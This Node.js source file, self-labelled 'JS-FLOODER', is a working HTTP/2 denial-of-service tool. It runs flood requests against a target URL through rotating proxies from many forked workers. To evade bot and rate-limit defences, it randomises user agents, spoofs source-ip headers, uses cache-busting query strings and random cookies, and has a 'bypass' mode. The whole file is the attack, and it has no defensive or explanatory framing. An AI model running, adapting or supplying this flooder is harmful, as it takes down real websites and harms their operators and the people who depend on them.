const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, net = require('net')
	, request = require('request')
	, cluster = require('cluster')
 randReferer = require('random-referer')
 const rand = randReferer.getRandom()
//random ua by string
const ua = require('user-agents');
const crypto = require('crypto');
const currentTime = new Date();
const httpTime = currentTime.toUTCString();
const errorHandler = error => {
	//console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
try {
	var colors = require('colors');
} catch (err) {
	console.log('\x1b[36mInstalling\x1b[37m the requirements');
	execSync('npm install colors');
	console.log('Done.');
	process.exit();
}
cplist = [
		'TLS_AES_128_CCM_8_SHA256',
		'TLS_AES_128_CCM_SHA256',
		'TLS_CHACHA20_POLY1305_SHA256',
		'TLS_AES_256_GCM_SHA384',
		'TLS_AES_128_GCM_SHA256'
		, ]
const sigalgs = [
	'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512'
	, 'ecdsa_brainpoolP256r1tls13_sha256'
	, 'ecdsa_brainpoolP384r1tls13_sha384'
	, 'ecdsa_brainpoolP512r1tls13_sha512'
	, 'ecdsa_sha1'
	, 'ed25519'
	, 'ed448'
	, 'ecdsa_sha224'
	, 'rsa_pkcs1_sha1'
	, 'rsa_pss_pss_sha256'
	, 'dsa_sha256'
	, 'dsa_sha384'
	, 'dsa_sha512'
	, 'dsa_sha224'
	, 'dsa_sha1'
	, 'rsa_pss_pss_sha384'
	, 'rsa_pkcs1_sha2240'
	, 'rsa_pss_pss_sha512'
	, 'sm2sig_sm3'
	, 'ecdsa_secp521r1_sha512'
, ];
let concu = sigalgs.join(':');

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
	cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	}
, }

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
function randomIp() {
	const segment1 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? nh?t (0-255)
	const segment2 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? hai (0-255)
	const segment3 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? ba (0-255)
	const segment4 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? t? (0-255)
	return `${segment1}.${segment2}.${segment3}.${segment4}`;
}

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
let input = process.argv[7];
let query = process.argv[8];
// Validate input
if (!target || !time || !thread || !proxyFile || !rps || !input) {
	console.log('JS-FLOODER'.bgRed)
	console.error(`Example: node ${process.argv[1]} url time thread proxy.txt rate bypass/flood query(true/false)`.rainbow);
 console.log('default : query : true'.red);
	process.exit(1);
}
// Validate target format
if (!/^https?:\/\//i.test(target)) {
	console.error('sent with http:// or https://');
	process.exit(1);
}
// Parse proxy list
let proxys = [];
try {
	const proxyData = fs.readFileSync(proxyFile, 'utf-8');
	proxys = proxyData.match(/\S+/g);
} catch (err) {
	console.error('Error proxy file:', err.message);
	process.exit(1);
}
// Validate RPS value
if (isNaN(rps) || rps <= 0) {
	console.error('number rps');
	process.exit(1);
}
const proxyr = () => {
	return proxys[Math.floor(Math.random() * proxys.length)];
}
if (cluster.isMaster) {
	console.clear()
	console.log(`success attack`.bgRed)
		, console.log(`flood`.yellow)
process.stdout.write("Loading: 10%\n");
setTimeout(() => {
  process.stdout.write("\rLoading: 50%\n");
}, 500 * time );

setTimeout(() => {
  process.stdout.write("\rLoading: 100%\n");
}, time * 1000);
	for (let counter = 1; counter <= thread; counter++) {
		cluster.fork();
	}
	setTimeout(() => process.exit(-1), time * 1000);
} else {
	setInterval(flood)
}

function flood() {
	var parsed = url.parse(target);
	var cipper = headerFunc.cipher();
	var proxy = proxyr().split(':');
	var randIp = randomIp();
	let interval

	if (input === 'flood') {
	  interval = 1000;
	} else if (input === 'bypass') {
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
  
	  // T?o m?t ?? tr? ng?u nhi?n t? 1000 ??n 5000 mili gi?y
	  interval = randomDelay(1000, 5000);
	} else {
	  interval = 1000;
	}
  
  
	  
	const mediaTypes = [
		'text/html'
		, 'application/xhtml+xml'
		, 'application/xml'
		, 'image/avif'
		, 'image/webp'
		, 'image/apng'
		, '/'
		, 'application/signed-exchange'
	];
	const acceptValues = [];
	mediaTypes.forEach((type, index) => {
		const quality = index === 0 ? 1 : (Math.random() * 0.9 + 0.1).toFixed(1);
		acceptValues.push(`${type};q=${quality}`);
	});
	const acceptHeader = acceptValues.join(',');
	  
	function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}

	  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
	
	function aString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
	const randstrsValue = randstr(25);
	
 	

	const rateHeaders = [
{ "dnt": "1"  },
{ "te" : "trailers"},
//{ "content-type": 'application/x-www-form-urlencoded'},
{ "origin": "https://" + parsed.host  },
{ "referer": "https://" + parsed.host + '/' },
{ "source-ip": randIp  },
{ "viewport-width": "1920"  },
{ "device-memory": "0.25"  },
//{ "forward": "for=" + randIp + ";proto=https;by=" + randIp  },
//{undefined}
];
const rateHeaders2 = [
{ "dnt": "1"  },
//{ "content-type": 'application/x-www-form-urlencoded'},
{ "origin": "https://" + parsed.host  },
{ "referer": "https://" + parsed.host + "/" },
{ "cookie": generateRandomString(1,5) + "=" + generateRandomString(120,150)  },
{ "viewport-width": "1920"  },
{ "device-memory": "0.25"  },
//{ "forward": "for=" + randIp + ";proto=https;by=" + randIp  },
//{undefined}
];


var hd1 = [ 
{ 'x-aspnet-version': randstrsValue},
//{undefined}
]
var hd2 = [ 
{'accept-charset' : randstrsValue},
{'Accept-Ranges': Math.random() < 0.5 ? 'bytes' : 'none'},
//{undefined}
]
const rhd = [
{ "worker": Math.random() < 0.5 ? 'true' : 'null'},
{ "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'null' },
{"expect-ct": "enforce"},
//{undefined}
]
var hdd = [
	{ "HTTP2-Setting" : Math.random() < 0.5 ? 'token64' : 'token68'},
	undefined
]
     


function generateRandomString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
   hd = {}
     header = {
    ':method': 'GET'
		, ':authority': parsed.host
		, 'x-forwarded-proto':'https'
    , 'NEl': JSON.stringify({
     "report_to": "default",
     "max-age": 2592000,
     "include_subdomains": true})
  };
  if (query === 'true'){
	header[':path']=parsed.path + '?' + generateRandomString(5, 15) + '=' + generateRandomString(20, 25) ;
  }else if (query === 'false'){
	header[':path']=parsed.path;
  }else{
	header[':path']=parsed.path + '?' + generateRandomString(5, 15) + '=' + generateRandomString(20, 25) ;
  }
header['cache-control']= Math.random() < 0.5 ? 'no-cache, no-store, max-age=0' : `max-age=${randstra(5)}`;
header[':scheme']= 'https';
header["upgrade-insecure-requests"]= "1";
    //uaaaa = {}
    //uaaaa['User-Agent'] = uas + generateRandomString(5, 10);
    //uaaaa["accept-features"]= "gzip, deflate"
	const agent = new http.Agent({
		host: proxy[0]
		, port: proxy[1]
		, keepAlive: true
		, keepAliveMsecs: 500000000
		, maxSockets: 50000
		, maxTotalSockets: 100000
	, });
	const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.host + ':443'
		, timeout: 1000
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'Keep-Alive'
		, }
	, };
	connection = http.request(Optionsreq, (res) => {});
	const TLSOPTION = {
		ciphers: cipper
		, secureProtocol: ["TLSv1_3_method"]
		//, sigals: concu
	//	, secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
		, echdCurve: "X25519"
		, secure: true
		, rejectUnauthorized: false
		, ALPNProtocols: ['h2']
	, };

	function createCustomTLSSocket(parsed, socket) {
		const tlsSocket = tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		//console.log('succes connect ')
		tlsSocket.setKeepAlive(true, 600000 * 1000);
		  
		return tlsSocket;
	}
	function generateJA3Fingerprint(socket) {
		const cipherInfo = socket.getCipher();
		const supportedVersions = socket.getProtocol();
	  
		if (!cipherInfo) {
		  console.error('Cipher info is not available. TLS handshake may not have completed.');
		  return null;
		}
	  
		const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
	  
		const md5Hash = crypto.createHash('md5');
		md5Hash.update(ja3String);
	  
		return md5Hash.digest('hex');
	  }	  
	  
 
	 
	connection.on('connect', function(res, socket) {
		
    socket.setKeepAlive(true, 100000);
		const tlsSocket = createCustomTLSSocket(parsed, socket);
let ja3Fingerprint; 


function getJA3Fingerprint() {
    return new Promise((resolve, reject) => {
        tlsSocket.on('secureConnect', () => {
            ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
            resolve(ja3Fingerprint); 
        });

        
        tlsSocket.on('error', (error) => {
            reject(error); 
        });
    });
}

async function main() {
    try {
        const fingerprint = await getJA3Fingerprint();  
        hd['ja3-fingerprint']= fingerprint  
    } catch (error) {
        
    }
}


main();
	const client = http2.connect(parsed.href, {
			createConnection: () => tlsSocket
			, settings: {
				headerTableSize: 65536
				, maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000
				, initialWindowSize: 6291456
				, maxHeaderListSize: 262144
				, enablePush: Math.random() < 0.5 ? true : false,
			}
		});
		client.on("connect", () => {
			setInterval(() => {
				for (let i = 0; i < rps; i++) {
					var operatingSystems = ["Windows NT 10.0", "Macintosh", "X11"];
					var architectures = {
					  "Windows NT 10.0": `${Math.random() < 0.5 ? `Win64; x64; rv:10${randstra(1)}.0` : `Win64; x64`}`,
            "Windows NT 11.0": `${Math.random() < 0.5 ? `WOW64; Trident/${randstra(2)}.${randstra(1)}; rv:10${randstra(1)}.0` : `Win64; x64`}`,
					  "Macintosh": `Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}`,
					  "X11": `${Math.random() < 0.5 ? `Linux x86_64; rv:10${randstra(1)}.0` : `Linux x86_64`}`
					};
					var browserss = [
						`Firefox/117.0`,
						`Firefox/116.0`,
						`Firefox/115.0`,
						`Firefox/114.0`,
						`Firefox/113.0`,
					  `Firefox/112.0`,
						`Firefox/111.0`,
						`Firefox/110.0`,
						`Firefox/109.0`,
					]
					var browsers = [
					   "Chrome/116.0.0.0 Safari/537.36",
					   "Chrome/115.0.0.0 Safari/537.36",
					   "Chrome/114.0.0.0 Safari/537.36",
					   "Chrome/113.0.0.0 Safari/537.36",
					   "Chrome/112.0.0.0 Safari/537.36",
					   "Chrome/111.0.0.0 Safari/537.36",
					   "Chrome/110.0.0.0 Safari/537.36",
					   "Chrome/109.0.0.0 Safari/537.36",
					   "Chrome/108.0.0.0 Safari/537.36",
					  "Version/16.5 Safari/605.1.15",
					  "Chrome/116.0.0.0 Safari/537.36 Edg/116", 
					 "Chrome/115.0.0.0 Safari/537.36 Edg/115",
					 "Chrome/114.0.0.0 Safari/537.36 Edg/114",
					 "Chrome/113.0.0.0 Safari/537.36 Edg/113",
					 "Chrome/112.0.0.0 Safari/537.36 Edg/112",
					 "Chrome/111.0.0.0 Safari/537.36 Edg/111",
					 "Chrome/110.0.0.0 Safari/537.36 Edg/110",
					 "Chrome/109.0.0.0 Safari/537.36 Edg/109",
					 "Chrome/108.0.0.0 Safari/537.36 Edg/108",
					 "Chrome/116.0.0.0 Safari/537.36 Vivaldi/116",
					 "Chrome/115.0.0.0 Safari/537.36 Vivaldi/115",
					 "Chrome/114.0.0.0 Safari/537.36 Vivaldi/114",
					 "Chrome/113.0.0.0 Safari/537.36 Vivaldi/113",
					 "Chrome/112.0.0.0 Safari/537.36 Vivaldi/112",
					 "Chrome/111.0.0.0 Safari/537.36 Vivaldi/111",
					 "Chrome/110.0.0.0 Safari/537.36 Vivaldi/110",
					 "Chrome/109.0.0.0 Safari/537.36 Vivaldi/109",
					  "Chrome/116.0.0.0 Safari/537.36 OPR/102",
					 
					];
					function getRandomValue(arr) {
					  const randomIndex = Math.floor(Math.random() * arr.length);
					  return arr[randomIndex];
					}
					
					const randomOS = getRandomValue(operatingSystems);
					const randomArch = architectures[randomOS]; 
					const randomBrowser = getRandomValue(browsers);
					const randomsBrowser = getRandomValue(browserss);
				  var uas = Math.random() < 0.5 ? `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser}`: `Mozilla/5.0 (${randomOS}; ${randomArch}) Gecko/20100101 ${randomsBrowser}`
				   var dynHeaders = {
					...hd[Math.floor(Math.random() * hd.length)],
					...header,
					
					'User-Agent': uas ,
					...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
					...hd2[Math.floor(Math.random() * hd2.length)],
					...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
					...rhd[Math.floor(Math.random() * rhd.length)],
					...hdd[Math.floor(Math.random() * hdd.length)],
					...hd1[Math.floor(Math.random() * hd1.length)],
					
				  };          
				
				
				
  const request = client.request(dynHeaders);
  
  request.end()
				}
			}, interval);
		});
		
		client.on("close", () => {
			client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return
		});




client.on("error", error => {
    if (error.code === 'ERR_HTTP2_GOAWAY_SESSIONaaaaaa') {
        console.log('Received GOAWAY error, pausing requests for 10 seconds\r');
        shouldPauseRequests = true;
        setTimeout(() => {
           
            shouldPauseRequests = false;
        },2000);
    } else if (error.code === 'ECONNRESETaa') {
        
        shouldPauseRequests = true;
        setTimeout(() => {
            
            shouldPauseRequests = false;
        }, 2000);
    }  else {
    }

    client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return
});

	});


	connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
	connection.on('timeout', () => {
		connection.destroy();
		return
	});
	connection.end();
}//
